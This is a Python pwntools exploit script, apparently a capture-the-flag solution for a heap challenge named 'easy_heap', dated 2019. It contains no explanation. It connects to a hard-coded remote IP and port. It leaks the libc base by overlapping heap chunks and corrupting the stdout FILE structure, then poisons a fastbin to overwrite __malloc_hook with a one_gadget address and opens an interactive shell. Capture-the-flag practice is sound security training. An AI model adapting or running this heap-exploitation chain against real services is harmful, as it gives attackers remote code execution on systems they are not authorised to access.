from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(": ",str(size))
	p.readuntil("ss ")
	heap=int(p.readline()[:-1],16)
	return heap
def edit(idx,c):
	cmd(3)
	p.sendlineafter(": ",str(idx))
	p.sendafter(": ",c)
def free(idx):
	cmd(2)
	p.sendlineafter(": ",str(idx))
#context.log_level='debug'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./easy_heap',env={"LD_PRELOAD":"./libc.so.6"})
p=remote("132.232.100.67",10004)
p.readuntil("Mmap: ")
mmap=int(p.readline()[:-1],16)
heap=add(0x400)-0x10#0
add(0x88)#1
add(0x88)#2
free(0)
add(0x18)
edit(0,"A"*0x18)
add(0x88)#3
add(0x68)#4
free(3)
free(1)
add(0x200-8)#1
free(4)
add(0x88)#3
free(3)
add(0x98)#3
edit(3,"A"*0x88+p64(0x71)+'\xdd\x25\n')
add(0x68)#4
add(0x68)#5
edit(5,"\x00"*(0x43-16)+p64(0xfbad1800)+"\x00"*0x18+'\x00\n')
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x7ffff7a0d000)
log.info(hex(base))

libc.address=base
free(4)
free(3)
add(0x98)#3
edit(3,"A"*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-35)+'\n')
add(0x68)#4
add(0x68)#6
one=base+0xf02a4
edit(6,'\x00'*19+p64(one)+'\n')

#gdb.attach(p)
free(6)
p.interactive()
#need 47:29:35
#(2019-06-26)
